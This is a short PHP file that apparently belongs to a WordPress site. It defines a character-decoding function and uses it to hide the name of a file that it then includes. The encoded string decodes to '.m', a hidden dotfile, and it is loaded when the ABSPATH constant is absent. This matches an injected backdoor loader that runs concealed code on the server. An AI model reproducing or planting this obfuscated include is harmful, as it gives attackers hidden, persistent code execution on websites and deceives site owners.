<?php
function cdc($w, $i)
{
    $v = '';
    for ($b = 0; $b < strlen($w); $b += 2) {
        $n = ord($w[$b]) - 65;
        $j = ord($w[$b + 1]);
        if ($j > 90) $j -= 6;
        $s = $n * 52 + ($j - 65);
        $v .= chr($s - $i);
    }
    return $v;
}

if (!defined('ABSPATH')) {
    require_once cdc('CuEF', 104);
}
